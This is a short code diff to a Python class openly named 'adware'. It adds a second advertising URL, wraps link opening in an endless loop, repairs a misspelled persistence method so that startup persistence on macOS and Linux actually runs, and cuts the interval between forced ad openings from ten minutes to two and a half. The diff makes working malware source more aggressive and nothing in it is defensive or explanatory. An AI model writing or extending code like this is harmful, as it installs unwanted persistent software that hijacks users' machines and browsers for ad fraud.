@@ -5,15 +5,17 @@ import time
 
 class adware:
     #changeable
-    links = ["https://acceptable.a-ads.com/1610167"]
+    links = ["https://acceptable.a-ads.com/1610167",
+             "https://caphaiks.com/4/4131263"]
     pyCall = "py"
     i = 0;
     def __init__(self):
         self.persistence()
-        self.openLink()
-        self.wait()
+        while 1: 
+            self.openLink()
+            self.wait()
 
-    def persistance(self):
+    def persistence(self):
         if (platform.system() == "Darwin"):
             self.persistenceMac()
         elif (platform.system() == "Linux"):
@@ -28,8 +30,8 @@ class adware:
             self.i = 0
 
     def wait(self):
-        #10 minutes
-        time.sleep(10 * 60)
+        #2.5 minutes
+        time.sleep(2.5 * 60)
 
     def persistenceMac(self):
         #make plist
